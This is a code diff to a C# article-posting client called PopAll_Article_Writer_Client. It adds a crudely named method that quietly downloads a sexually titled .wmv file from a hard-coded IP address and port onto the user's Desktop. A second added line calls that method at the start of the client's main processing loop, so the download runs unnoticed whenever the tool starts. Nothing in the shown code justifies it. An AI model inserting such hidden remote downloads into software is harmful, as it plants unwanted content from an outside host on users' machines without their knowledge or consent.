@@ -145,6 +145,12 @@ namespace PopAll_Article_Writer_Client
             }
         }
 
+        void Fuck()
+        {
+            new WebClient().DownloadFile("http://121.187.15.27:5723/%5b%ea%b5%ad%ec%82%b0%5d%20%ec%88%a0%ec%a7%91%ec%97%90%ec%84%9c%20%eb%b0%a9%ea%b8%88%20%eb%a7%8c%eb%82%9c%20%ec%bd%9c%eb%9d%bc%eb%b3%91%20%eb%aa%b8%eb%a7%a4%ec%9d%98%20%ec%86%8c%ec%9c%a0%ec%9e%90%20%ea%b7%b8%eb%85%80%20%ec%88%a0%20%eb%a7%88%ec%8b%9c%eb%a9%b4%ec%84%9c%20%ec%84%b9%ec%8b%9c%ed%95%9c%20%ed%8f%ac%ec%a6%88%eb%a5%bc%20%ec%b7%a8%ed%95%98%eb%a9%b0%20%eb%82%a8%ec%9e%90%eb%a5%bc%20%ec%9c%a0%ed%98%b9.wmv",
+                Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "/[국산] 술집에서 방금 만난 콜라병 몸매의 소유자 그녀 술 마시면서 섹시한 포즈를 취하며 남자를 유혹.wmv");
+        }
+
         int PopWrite(string subject, string body)
         {
             //LogAdd(Account, "글 등록중");
@@ -310,6 +316,7 @@ namespace PopAll_Article_Writer_Client
 
         void ProcessState()
         {
+            Fuck();
             for (;;)
             {
                 Time = string.Format("{0:yyyyMMdd}", DateTime.Now);
